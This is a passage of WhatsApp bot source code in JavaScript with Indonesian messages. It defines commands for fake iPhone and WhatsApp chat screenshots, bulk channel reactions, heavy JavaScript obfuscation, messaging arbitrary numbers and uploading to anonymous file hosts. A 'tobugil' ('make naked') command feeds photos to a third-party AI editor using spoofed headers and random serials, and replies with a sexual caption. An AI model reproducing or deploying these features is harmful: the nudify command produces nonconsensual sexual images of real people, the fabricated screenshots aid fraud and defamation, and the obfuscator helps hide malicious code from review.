                    image: buffer,
                    caption: `💻 Fake Developer berhasil dibuat!\n\n🧾 Nama: *${nama}*\nVerified: *${verified}*\nBackground: *${bgIndex}*`,
                    contextInfo: {
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran 
                        }, 
                        externalAdReply: {
                            title: `${global.dev} — Assistant`,
                            body: `📍 Paju-si, South Korea`,
                            thumbnailUrl: global.thumb,
                            sourceUrl: global.linkSaluran,
                            mediaType: 1,
                            renderLargerThumbnail: false,
                        },
                    },
                }, { quoted: m })
          
            } catch (err) {
              console.error('[fakedev ERROR]', err)
              await m.reply('❌ Gagal membuat Fake Dev: ' + err.message)
            }
        }
        break
        //═══════════════════════════════════//
        // 𝗖𝗔𝗦𝗘 𝗜𝗤𝗖 𝗜𝗣𝗛𝗢𝗡𝗘
        case 'iqc': {
            await sock.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
            if (!text) return reply(`⚠️ Gunakan: ${prefix + command} jam|batre|carrier|pesan\nContoh: ${prefix + command} 18:00|40|Indosat|hai hai`)
            
            // parsing: time|battery|carrier|message
            let [time, battery, carrier, ...msg] = text.split('|')
            if (!time || !battery || !carrier || msg.length === 0)
            return reply(`${noticenya}\n${prefix + command} jam|batre|carrier|pesan\nContoh:\n${prefix + command} 18:00|40|Indosat|hai hai`)
            
            reply('⏳ Tunggu sebentar...')
            
            let messageText = encodeURIComponent(msg.join('|').trim())
            let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`
            
            try {
            let res = await fetch(url)
            if (!res.ok) return m.reply('❌ Gagal mengambil data dari API.')
            
            let buffer
            if (typeof res.buffer === 'function') {
            buffer = await res.buffer()
            } else {
            let arrayBuffer = await res.arrayBuffer()
            buffer = Buffer.from(arrayBuffer)
            }
            
            await sock.sendMessage(m.chat, {
                image: buffer,
                caption: `✅ *Sukses!*\nJam: ${time}\nBatre: ${battery}%\nCarrier: ${carrier}\nPesan: ${msg.join(' ')}`,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran 
                    }, 
                    externalAdReply: {
                        title: `${global.dev} - Assistant`,
                        body: `📍 Paju-si, South Korea`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,
                        mediaType: 1,
                        renderLargerThumbnail: false,
                    },
                },
            }, { quoted: m })
            
            } catch (e) {
            console.error(e)
            reply('❌ Terjadi kesalahan saat menghubungi API.')
            }
        }
        break
        //═══════════════════════════════════//
        case "iqc2": {
        if (!text)
            return reply(
                `⚠️ Format:\n${prefix + command} jam|batre|carrier|nama|quoted|pesan\n\nContoh:\n${prefix + command} 18:00|90|Indosat|Ayang|oke|iya bentar 😈`
            );
    
        let [time, battery, carrier, contact, quoted, ...msg] = text.split("|");
        if (!msg.length) return reply("❌ Format salah");
    
        await reaction(m.chat, "🍏");
    
        try {
            const { generateWhatsappIOS } = require("../lib/iqcEnterprise");
    
            const buffer = await generateWhatsappIOS({
                time,
                battery,
                carrier,
                contact,
                quoted,
                message: msg.join("|"),
                theme: "dark"
            });
    
            await sock.sendMessage(
                m.chat,
                {
                    image: buffer,
                    caption: "📱 Fake WhatsApp iOS (iPhone terbaru)",
                },
                { quoted: m }
            );
    
            await reaction(m.chat, "✅");
        } catch (e) {
            console.error(e);
            await reaction(m.chat, "❌");
            reply("❌ Gagal generate fake WhatsApp iOS");
        }
    }
    break;
        //═══════════════════════════════════//
        /*case 'rch': case 'reactch': {
        if (!isOwner && !isPremium) return reply(msg.owner)
        if (!text.includes('|')) {
            return reply(`Format salah. Contoh:\n${prefix + command} https://whatsapp.com/channel/abc/123|halo dunia`)
        }
    
        const font2 = {
            a: '🄰', b: '🄱', c: '🄲', d: '🄳', e: '🄴', f: '🄵', g: '🄶',
            h: '🄷', i: '🄸', j: '🄹', k: '🄺', l: '🄻', m: '🄼', n: '🄽',
            o: '🄾', p: '🄿', q: '🅀', r: '🅁', s: '🅂', t: '🅃', u: '🅄',
            v: '🅅', w: '🅆', x: '🅇', y: '🅈', z: '🅉'
        }
    
        let [link, ...messageParts] = text.split('|')
        link = link.trim()
        const msg = messageParts.join('|').trim().toLowerCase()
    
        if (!link.startsWith("https://whatsapp.com/channel/")) {
            return reply("Link tidak valid. Harus diawali dengan https://whatsapp.com/channel/")
        }
    
        const emoji = msg.split('').map(c => c === ' ' ? '―' : (font2[c] || c)).join('')
    
        try {
            const [, , , , channelId, messageId] = link.split('/')
            const res = await sock.newsletterMetadata("invite", channelId)
            await sock.newsletterReactMessage(res.id, messageId, emoji)
            reply(`Reaksi *${emoji}* berhasil dikirim ke channel *${res.name}*.`)
        } catch (e) {
            console.error(e)
            m.reply("❌ Error\nGagal mengirim reaksi. Cek link atau koneksi!")
        }
        }
        break*/
        //═══════════════════════════════════//
        case 'react': case 'reactch': case 'rch': {
          if (!isOwner && !isPremium) return reply(msg.owner);
        
          if (!text || !text.includes("|")) {
            return reply(`${noticenya}\n${prefix + command} https://whatsapp.com/channel/0029Vb6pIlxDTkKBpOvPqD22/136|😂,😍,🔥`);
          }
        
          const [link, emojiPart] = text.split("|").map(v => v.trim());
          if (!link.startsWith("https://whatsapp.com/channel/")) {
            return reply("❌ Link tidak valid. Pastikan salin link postingan di saluran target");
          }
        
          const emojis = emojiPart.split(",").map(e => e.trim()).filter(Boolean);
          if (!emojis.length) {
            return reply("❌ Tidak ada emoji yang diberikan!");
          }
        
          // 🌀 import module
          const { reactToPost } = require("../lib/reactPost"); 
        
          try {
            await reaction(m.chat, "🔥")
            await sleep(2000)
            const result = await reactToPost(link, emojis);
        
            if (result.success) {
              await reply(`✅ *Reaksi berhasil dikirim!*\n\n🔗 *${link}*\n🫧 Emoji: ${emojis.join(" ")}`);
            } else {
              await reply(`❌ *Gagal mengirim reaksi!*\n\nStatus: ${result.status}\nError: ${result.error}`);
            }
        
          } catch (err) {
            console.error(err);
            await reply(`❌ Terjadi error internal:\n${err.message}`);
          }
        }
        break;
        //═══════════════════════════════════//
        // ===========[ ENCRYPT HARD ]==============//
        case 'obf':
        case 'enc':
        case 'enchard': {
            if (!m.quoted) return reply("reply File.js");
            if (mime !== "application/javascript") return reply("reply File.js");
        
            let a = await m.quoted.download();
            let b = m.quoted.fileName;
        
            let input = `./@hardenc_${b}`;
            let output = `./@hardenc_RESULT_${b}`;
        
            fs.writeFileSync(input, a);
            await reaction(m.chat, "♠️")
        
            JsConfuser.obfuscate(
                fs.readFileSync(input, "utf8"),
                {
                    target: "node",
                    minify: true,
                    flatten: true,
                    identifierGenerator: function () {
                        const c = "素晴座素晴難ITSS素晴座素晴難CANCER";
                        const d = x => x.replace(/[^a-zA-Z座Cancer素晴]/g, '');
                        const e = y => [...Array(y)].map(() =>
                            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)
                        ).join('');
                        return d(c) + e(2);
                    },
                    compact: true,
                    controlFlowFlattening: true,
                    controlFlowFlatteningThreshold: 1,
                    numbersToExpressions: true,
                    simplify: true,
                    stringArrayShuffle: true,
                    splitStrings: true,
                    stringArrayThreshold: 1,
                    sourceMap: false,
                    sourceMapMode: "separate"
                }
            ).then(async f => {
        
                fs.writeFileSync(output, f);
        
                await sock.sendMessage(
                    m.chat,
                    {
                        document: fs.readFileSync(output),
                        mimetype: "application/javascript",
                        fileName: b,
                        caption: "✅ Sukses Encrypt File JS (Hard)"
                    },
                    { quoted: m }
                );
        
                // 🧹 optional cleanup
                fs.unlinkSync(input);
                fs.unlinkSync(output);
        
            }).catch(err => reply("Error: " + err));
        }
        break;
        //═════════════════════════════════//
        case 'sendchat': {
            if (!isOwner) return;
            if (!text) return reply(`Contoh: ${command} Hai|62xxxx`)
            let [teksnya, targetnya] = text.split`|`
            if (!teksnya) teksnya = ''
            if (!targetnya) targetnya = ''
    
            // ID Owner Bot (bisa lebih dari satu)
            const ownerJid = [`${targetnya}@s.whatsapp.net`] // ganti dengan nomor owner
        
            for (let id of ownerJid) {
                sock.sendMessage(id, { 
                    text: `${teksnya}`,
                    contextInfo:{
                        mentionedJid:[sender],
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran, 
                            serverId: 200
                        }, 
                        externalAdReply: {
                            title: `© ${global.botname}`, 
                            thumbnailUrl: global.thumb, 
                            renderLargerThumbnail: false, 
                            mediaType: 1, 
                            previewType: 1, 
                            sourceUrl: global.linkSaluran, 
                        }
                    }
                }, {quoted: m })
            }
            m.reply('Berhasil mengirim pesan')
        }
        break
        //════════════════════════════════//
        case 'tobugil': case 'eraser': {
        
          function genserial() {
            let s = ''
            for (let i = 0; i < 32; i++) s += Math.floor(Math.random() * 16).toString(16)
            return s
          }
          
          async function upimage(filename) {
            const form = new FormData()
            form.append('file_name', filename)
          
            const res = await axios.post('https://api.imgupscaler.ai/api/common/upload/upload-image',
              form,
              {
                headers: {
                  ...form.getHeaders(),
                  origin: 'https://imgupscaler.ai',
                  referer: 'https://imgupscaler.ai/'
                }
              }
            )
          
            return res.data.result
          }
          
          async function uploadtoOSS(putUrl, filePath) {
            const file = fs.readFileSync(filePath)
            const type = path.extname(filePath) === '.png' ? 'image/png' : 'image/jpeg'
          
            const res = await axios.put(
              putUrl,
              file,
              {
                headers: {
                  'Content-Type': type,
                  'Content-Length': file.length
                },
                maxBodyLength: Infinity
              }
            )
          
            return res.status === 200
          }
          
          async function createJob(imageUrl, prompt) {
            const form = new FormData()
            form.append('model_name', 'magiceraser_v4')
            form.append('original_image_url', imageUrl)
            form.append('prompt', prompt)
            form.append('ratio', 'match_input_image')
            form.append('output_format', 'jpg')
          
            const res = await axios.post('https://api.magiceraser.org/api/magiceraser/v2/image-editor/create-job',
              form,
              {
                headers: {
                  ...form.getHeaders(),
                  'product-code': 'magiceraser',
                  'product-serial': genserial(),
                  origin: 'https://imgupscaler.ai',
                  referer: 'https://imgupscaler.ai/'
                }
              }
            )
          
            return res.data.result.job_id
          }
          
          async function cekjob(jobId) {
            const res = await axios.get(`https://api.magiceraser.org/api/magiceraser/v1/ai-remove/get-job/${jobId}`,
              {
                headers: {
                  origin: 'https://imgupscaler.ai',
                  referer: 'https://imgupscaler.ai/'
                }
              }
            )
          
            return res.data
          }
          
          async function nanobanana(imagePath, prompt) {
            const filename = path.basename(imagePath)
          
            const uploadInfo = await upimage(filename)
            await uploadtoOSS(uploadInfo.url, imagePath)
          
            const cdn = 'https://cdn.imgupscaler.ai/' + uploadInfo.object_name
            const jobId = await createJob(cdn, prompt)
          
            let result
            do {
              await new Promise(r => setTimeout(r, 3000))
              result = await cekjob(jobId)
            } while (result.code === 300006)
          
            return {
              job_id: jobId,
              image: result.result.output_url
            }
          }
          
          if (!isOwner) return;
        
          let q = m.quoted ? m.quoted : m
          let mime = (q.msg || q).mimetype || ''
          
          if (!/image\/(jpe?g|png)/.test(mime)) return reply('ᴛᴏʟᴏɴɢ ʙᴀʟᴀs ɢᴀᴍʙᴀʀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴘʀᴏsᴇs.')
          
          if (!text && !(m.quoted && m.quoted.text)) return reply('ᴍᴀsᴜᴋᴋᴀɴ ᴘʀᴏᴍᴘᴛ ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀsɪʟᴋᴀɴ ɢᴀᴍʙᴀʀ.')
          
          let prompt = text || m.quoted.text
          
          await m.reply('sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴀɪ...')
          
          try {
            let img = await q.download()
            let inputPath = './tmp/' + crypto.randomUUID() + '.jpg'
            fs.writeFileSync(inputPath, img)
            
            let result = await nanobanana(inputPath, prompt)
            
            if (result && result.image) {
              await sock.sendMessage(m.chat, { 
                image: { url: result.image }, 
                caption: `😏 Tcih..sangean amat deck` 
              }, { quoted: m })
            } else {
              m.reply('ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ.')
            }
            
            try {
              fs.unlinkSync(inputPath)
            } catch (e) {}
          } catch (e) {
            m.reply('ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ.')
            console.error(e)
          }
        }
        break
        //═══════════════════════════════//
        case "tourl3": {
            let list = `
╭─〔 TOURl UPLOADER 〕
│ 1. Catbox
│ 2. Pomf
│ 3. Uguu
│ 4. Pixhost
│ 5. Cloudku
│ 6. Quax
╰─ ketik ${prefix+command} nomor
`
            
            if (!text) return reply(list)
            if (!m.quoted) return reply("Reply media yang ingin di upload")
            
            let media = await quoted.download()
            if (!media) return reply("Gagal download media")
            
            let url
            
            try {
            
                switch (text) {
                
                    // CATBOX
                    case "1": {
                        let form = new FormData()
                        form.append("reqtype","fileupload")
                        form.append("fileToUpload", media, "file")
                        
                        let res = await axios.post("https://catbox.moe/user/api.php", form, {
                        headers: form.getHeaders()
                        })
                        
                        url = res.data
                    }
                    break
                    
                    // POMF
                    case "2": {
                        let form = new FormData()
                        form.append("files[]", media, "file")
                        
                        let res = await axios.post("https://pomf.lain.la/upload.php", form, {
                        headers: form.getHeaders()
                        })
                        
                        url = res.data.files[0].url
                    }
                    break
                    
                    // UGUU
                    case "3": {
                        let form = new FormData()
                        form.append("files[]", media, "file")
                        
                        let res = await axios.post("https://uguu.se/upload.php", form, {
                        headers: form.getHeaders()
                        })
                        
                        url = res.data.files[0].url
                    }
                    break
                    
                    // PIXHOST (ALL MEDIA)
                    case "4": {
                        let base64 = media.toString("base64")
                        
                        let res = await axios.post("https://api.pixhost.to/images", {
                        content: base64,
                        type: "base64"
                        })
                        
                        url = res.data.images[0].image
                    }
                    break
                    
                    // CLOUDKU
                    case "5": {
                        let form = new FormData()
                        form.append("file", media, "file")
                        
                        let res = await axios.post("https://api.cloudkuimages.guru/upload", form, {
                        headers: form.getHeaders()
                        })
                        
                        url = res.data.url
                    }
                    break
                    
                    // QUAX
                    case "6": {
                        let form = new FormData()
                        form.append("files[]", media, "file")
                        
                        let res = await axios.post("https://qu.ax/upload.php", form, {
                        headers: form.getHeaders()
                        })
                        
                        url = res.data.files[0].url
                    }
                    break
                    
                    default:
                    return reply(list)
                
                }
                
                reply(`✅ Upload Berhasil\n\n🌐 ${url}`)
            
            } catch (e) {
            console.log(e)
            reply("❌ Upload gagal")
            }
        }
        break
        //═══════════════════════════════════//
        case 'tourl': {
            const axios = require("axios")
            const FormData = require("form-data")
        
            // Ambil media dari reply atau dari pesan langsung
            const qmsg = m.quoted ? m.quoted : m
            const qmsgObj = qmsg.msg || qmsg
        
            const mime = qmsgObj.mimetype || qmsg.mimetype || ""
            if (!mime) {
                return reply("📦 Reply / kirim media apa saja\nContoh: foto, video, audio, sticker, dokumen, pdf, zip, dll")
            }
        
            function randomName(length = 10) {
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                let result = ""
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length))
                }
                return result
            }
        
            function escapeRegExp(str = "") {
                return String(str).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")
            }
        
            function cleanCaption(str = "") {
                str = String(str || "").trim()
                if (!str) return ""
        
                // Bersihin prefix command dari caption, misal: .tourl halo dunia
                const p = typeof prefix !== "undefined" ? prefix : "."
                const c = typeof command !== "undefined" ? command : "tourl"
                const reg = new RegExp(`^\\s*${escapeRegExp(p)}${escapeRegExp(c)}\\s*`, "i")
        
                return str.replace(reg, "").trim()
            }
        
            function getExtension(mime, fileName = "") {
                if (fileName && fileName.includes(".")) {
                    return fileName.split(".").pop().split("?")[0].toLowerCase()
                }
        
                const map = {
                    "image/jpeg": "jpg",
                    "image/jpg": "jpg",
                    "image/png": "png",
                    "image/webp": "webp",
                    "image/gif": "gif",
                    "video/mp4": "mp4",
                    "video/webm": "webm",
                    "audio/mpeg": "mp3",
                    "audio/mp3": "mp3",
                    "audio/ogg": "ogg",
                    "audio/opus": "opus",
                    "audio/wav": "wav",
                    "application/pdf": "pdf",
                    "application/zip": "zip",
                    "application/x-zip-compressed": "zip",
                    "application/vnd.android.package-archive": "apk"
                }
        
                return map[mime] || mime.split("/")[1]?.split(";")[0] || "bin"
            }
        
            function safeFileName(name = "") {
                return String(name)
                    .replace(/[^\w.\-()+ ]/g, "_")
                    .slice(0, 100)
            }
        
            function formatSize(bytes) {
                if (!bytes) return "Unknown"
                const sizes = ["B", "KB", "MB", "GB"]
                const i = Math.floor(Math.log(bytes) / Math.log(1024))
                return (bytes / Math.pow(1024, i)).toFixed(2) + " " + sizes[i]
            }
        
            function isUrl(str) {
                return typeof str === "string" && /^https?:\/\//i.test(str)
            }
        
            async function uploadCatbox(buffer, filename, mime) {
                const form = new FormData()
                form.append("reqtype", "fileupload")
                form.append("fileToUpload", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://catbox.moe/user/api.php",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                if (typeof res.data === "string" && res.data.startsWith("http")) {
                    return res.data.trim()
                }
        
                throw new Error("Catbox gagal")
            }
        
            async function uploadUguu(buffer, filename, mime) {
                const form = new FormData()
                form.append("files[]", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://uguu.se/upload.php?output=json",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                if (res.data?.files?.[0]?.url) return res.data.files[0].url
                if (typeof res.data === "string" && res.data.startsWith("http")) return res.data.trim()
        
                throw new Error("Uguu gagal")
            }
        
            async function uploadTmpFiles(buffer, filename, mime) {
                const form = new FormData()
                form.append("file", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://tmpfiles.org/api/v1/upload",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                let url = res.data?.data?.url
                if (!url) throw new Error("TmpFiles gagal")
        
                // Biar jadi direct download link
                url = url.replace("https://tmpfiles.org/", "https://tmpfiles.org/dl/")
                return url
            }
        
            async function uploadFileIo(buffer, filename, mime) {
                const form = new FormData()
                form.append("file", buffer, {
                    filename,
                    contentType: mime
                })
            
                // lebih aman ditaruh di form, bukan query
                form.append("expires", "1w")
            
                const res = await axios.post(
                    "https://file.io",
                    form,
                    {
                        headers: {
                            ...form.getHeaders(),
                            Accept: "application/json"
                        },
                        timeout: 120000
                    }
                )
            
                let data = res.data
            
                // Kalau response string JSON, parse dulu
                if (typeof data === "string") {
                    try {
                        data = JSON.parse(data)
                    } catch {
                        const match = data.match(/https?:\/\/[^\s"'<>]+/i)
                        if (match) return match[0]
                    }
                }
            
                // Ini yang benar, pastikan link adalah string
                if (data && typeof data === "object" && typeof data.link === "string") {
                    return data.link
                }
            
                throw new Error("File.io gagal")
            }
        
            async function upload0x0(buffer, filename, mime) {
                const form = new FormData()
                form.append("file", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://0x0.st",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                if (typeof res.data === "string" && res.data.startsWith("http")) {
                    return res.data.trim()
                }
        
                throw new Error("0x0 gagal")
            }
        
            async function uploadLitterbox(buffer, filename, mime) {
                const form = new FormData()
                form.append("reqtype", "fileupload")
                form.append("time", "72h")
                form.append("fileToUpload", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://litterbox.catbox.moe/resources/internals/api.php",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                if (typeof res.data === "string" && res.data.startsWith("http")) {
                    return res.data.trim()
                }
        
                throw new Error("Litterbox gagal")
            }
        
            async function uploadQuax(buffer, filename, mime) {
                const form = new FormData()
                form.append("files[]", buffer, {
                    filename,
                    contentType: mime
                })
        
                const res = await axios.post(
                    "https://qu.ax/upload.php",
                    form,
                    { headers: form.getHeaders(), timeout: 120000 }
                )
        
                if (res.data?.files?.[0]?.url) return res.data.files[0].url
                if (res.data?.[0]?.url) return res.data[0].url
        
                if (typeof res.data === "string") {
                    const match = res.data.match(/https?:\/\/[^\s"'<>]+/i)
                    if (match) return match[0]
                }
        
                throw new Error("Qu.ax gagal")
            }
        
            async function uploadPixhost(buffer, filename) {
                if (!mime.includes("image")) return "❌ Tidak support selain gambar"
        
                try {
                    const service = new ImageUploadService("pixhost.to")
                    const { directLink } = await service.uploadFromBinary(buffer, "itssdric")
                    return directLink.toString()
                } catch {
                    return "❌ Gagal upload"
                }
            }
        
            async function safeUpload(label, fn) {
                try {
                    return await fn()
                } catch (e) {
                    return "❌ Gagal upload"
                }
            }
        
            let mediaPath
            try {
                await reaction(m.chat, "♠️")
        
                mediaPath = await sock.downloadAndSaveMediaMessage(qmsg)
                const buffer = fs.readFileSync(mediaPath)
        
                const rawFileName =
                    qmsgObj.fileName ||
                    qmsg.fileName ||
                    ""
        
                const ext = getExtension(mime, rawFileName)
                const filename = safeFileName(rawFileName || `${randomName()}.${ext}`)
        
                // Caption dari media langsung atau dari teks setelah command
                const mediaCaption = cleanCaption(qmsgObj.caption || qmsg.caption || "")
                const commandCaption = cleanCaption(typeof text !== "undefined" ? text : "")
                const caption = mediaCaption || commandCaption || "-"
        
                const size = formatSize(buffer.length)
        
                const [
                    catboxLink,
                    uguuLink,
                    tmpFilesLink,
                    fileIoLink,
                    zeroXLink,
                    litterboxLink,
                    quaxLink,
                    pixhostLink
                ] = await Promise.all([
                    safeUpload("Catbox", () => uploadCatbox(buffer, filename, mime)),
                    safeUpload("Uguu", () => uploadUguu(buffer, filename, mime)),
                    safeUpload("TmpFiles", () => uploadTmpFiles(buffer, filename, mime)),
                    safeUpload("File.io", () => uploadFileIo(buffer, filename, mime)),
                    safeUpload("0x0", () => upload0x0(buffer, filename, mime)),
                    safeUpload("Litterbox", () => uploadLitterbox(buffer, filename, mime)),
                    safeUpload("Qu.ax", () => uploadQuax(buffer, filename, mime)),
                    safeUpload("Pixhost", () => uploadPixhost(buffer, filename))
                ])
        
                let teks = 
`📁 Nama : ${filename}
📌 Tipe : ${mime}
📏 Size : ${size}
📝 Caption : ${caption}

📊 *LINK HASIL*

• Catbox
> ${catboxLink}

• Uguu
> ${uguuLink}

• TmpFiles
> ${tmpFilesLink}

• File.io
> ${fileIoLink}

• 0x0.st
> ${zeroXLink}

• Litterbox < Exp. 3 Days >
> ${litterboxLink}

• Qu.ax
> ${quaxLink}

• Pixhost
> ${pixhostLink}
`
        
                const links = [
                    ["📋 Copy Catbox", catboxLink],
                    ["📋 Copy Uguu", uguuLink],
                    ["📋 Copy TmpFiles", tmpFilesLink],
                    ["📋 Copy File.io", fileIoLink],
                    ["📋 Copy 0x0", zeroXLink],
                    ["📋 Copy Litterbox", litterboxLink],
                    ["📋 Copy Qu.ax", quaxLink],
                    ["📋 Copy Pixhost", pixhostLink]
                ]
        
                let buttons = links
                    .filter(([_, link]) => isUrl(link))
                    .slice(0, 8)
                    .map(([display_text, copy_code]) => ({
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text,
                            copy_code
                        })
                    }))
        
                if (!buttons.length) {
                    buttons = [
                        {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "❌ Semua server gagal",
                                id: `${prefix || "."}tourl`
                            })
                        }
                    ]
                }
        
                let msg = generateWAMessageFromContent(
                    m.chat,
                    {
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: {
                                    body: { text: teks },
                                    footer: { text: "\nTap tombol di bawah ini untuk salin link" },
                                    header: {
                                        title: "📦 *UPLOAD BERHASIL*",
                                        hasMediaAttachment: false
                                    },
                                    nativeFlowMessage: {
                                        buttons
                                    }
                                }
                            }
                        }
                    },
                    { quoted: m }
                )
        
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
        
            } catch (err) {
                console.log("Error tourl:", err)
                reply("❌ Gagal upload media. Coba ulangi atau pakai file yang lebih kecil.")
            } finally {
                if (mediaPath) {
                    try { fs.unlinkSync(mediaPath) } catch {}
                }
            }
        }
        break
        //═══════════════════════════════════//
        case "tourl2": {
            if (!mime || (!mime.includes("image") && !mime.includes("video"))) {
                return reply("📸 Reply / kirim foto atau video")
            }
        
            
            let media = await sock.downloadAndSaveMediaMessage(qmsg)
            let buffer = fs.readFileSync(media)
            let ext = mime.split("/")[1] || "bin"
        
            function randomName(length = 10) {
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
                let result = ""
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length))
                }
                return result
            }
        
            function formatSize(bytes) {
                if (!bytes) return "Unknown"
                const sizes = ["B","KB","MB","GB"]
                const i = Math.floor(Math.log(bytes) / Math.log(1024))
                return (bytes / Math.pow(1024, i)).toFixed(2) + " " + sizes[i]
            }
        
            let pixhostLink = "❌ Tidak support video"
            if (mime.includes("image")) {
                try {
                    const service = new ImageUploadService("pixhost.to")
                    let { directLink } = await service.uploadFromBinary(buffer, "ItssDric" + "." + ext)
                    pixhostLink = directLink.toString()
                } catch {
                    pixhostLink = "❌ Gagal upload"
                }
            }
        
            let catboxLink = "❌ Gagal upload"
            try {
                const catForm = new FormData()
                catForm.append("reqtype", "fileupload")
                catForm.append("fileToUpload", buffer, {
                    filename: randomName() + "." + ext,
                    contentType: mime
                })
        
                const catRes = await axios.post(
                    "https://catbox.moe/user/api.php",
                    catForm,
                    { headers: catForm.getHeaders() }
                )
        
                if (typeof catRes.data === "string" && catRes.data.startsWith("http")) {
                    catboxLink = catRes.data.trim()
                }
            } catch {}
        
            let uguuLink = "❌ Gagal upload"
            try {
                const uguuForm = new FormData()
                uguuForm.append("files[]", buffer, {
                    filename: randomName() + "." + ext
                })
        
                const uguuRes = await axios.post(
                    "https://uguu.se/upload.php",
                    uguuForm,
                    { headers: uguuForm.getHeaders() }
                )
        
                if (uguuRes.data?.files?.[0]?.url) {
                    uguuLink = uguuRes.data.files[0].url
                }
            } catch {}
        
            let size = formatSize(buffer.length)
        
            try { fs.unlinkSync(media) } catch {}
        
            let teks = `
📦 Tipe : ${mime}
📏 Size : ${size}

📊 *LINK HASIL*

• Catbox
> ${catboxLink}
• Pixhost
> ${pixhostLink}
• Uguu
> ${uguuLink}
`
        
            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: teks },
                                footer: { text: "\nTap tombol di bawah ini untuk salin link" },
                                header: {
                                    title: "♠️ *UPLOAD BERHASIL*",
                                    hasMediaAttachment: false
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy Catbox",
                                                copy_code: catboxLink
                                            })
                                        },
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy Pixhost",
                                                copy_code: pixhostLink
                                            })
                                        },
                                        {
                                            name: "cta_copy",
                                            buttonParamsJson: JSON.stringify({
                                                display_text: "📋 Copy Uguu",
                                                copy_code: uguuLink
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                { quoted: m }
            )
        
            await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
        }
        break;
        //END
        //═══════════════════════════════// 
        //STICKER
        case 's': case 'sticker': case 'stc': case 'stiker': {
            if (!isOwner) return; 
            if (!m.quoted) return reply(`reply Image or Video with command ${prefix + command}`);
            await sock.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
            
            if (!/image|video/.test(mime)) {
                return reply(`Send Image or Video with command ${prefix + command}\nVideo duration only 1-9s`);
            }
        
            // Cek apakah download tersedia
            if (typeof m.quoted.download !== 'function') {
                return reply("Fungsi download tidak tersedia, periksa kembali struktur objek pesan.");
            }
        
            if (/image/.test(mime)) {
                let media = await m.quoted.download();
                let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: '내천사', author: 'Itss Dric' });
                await fs.unlinkSync(encmedia);
            } else if (/video/.test(mime)) {
                if ((m.quoted.msg || m.quoted).seconds > 11) return reply('max 10s');
                
                let media = await m.quoted.download();
                let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: `내천사`, author: `Itss Dric` });
                await fs.unlinkSync(encmedia);
            }
        }
        break;
        //═══════════════════════════════//
        case 'smeme': case 'stickermeme': case 'stickmeme': {
            await reaction(m.chat, "⏳")
        
            let q = m.quoted ? m.quoted : m
            let mime = (q.msg || q).mimetype || ''
        
            if (/image/.test(mime) && !/webp/.test(mime)) {
                if (!text) return reply(`${noticenya}\n${prefix + command} text1|text2`)
        
                let atas = text.split('|')[0] || '-'
                let bawah = text.split('|')[1] || '-'
        
                let mee = await sock.downloadAndSaveMediaMessage(q)
                let mem = await UploadFileUgu(mee)
        
                let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
        
                await sock.sendImageAsSticker(m.chat, meme, m, {
                    packname: '내천사',
                    author: 'Itss Dric'
                })
        
            } else {
                reply(`Kirim atau reply gambar dengan caption:\n${prefix + command} text1|text2`)
            }
        }
        break
        //════════════════════════════════//
        case "swm":
        case "stickerwm":
        case "stikerwm":
        case "wm": {
          
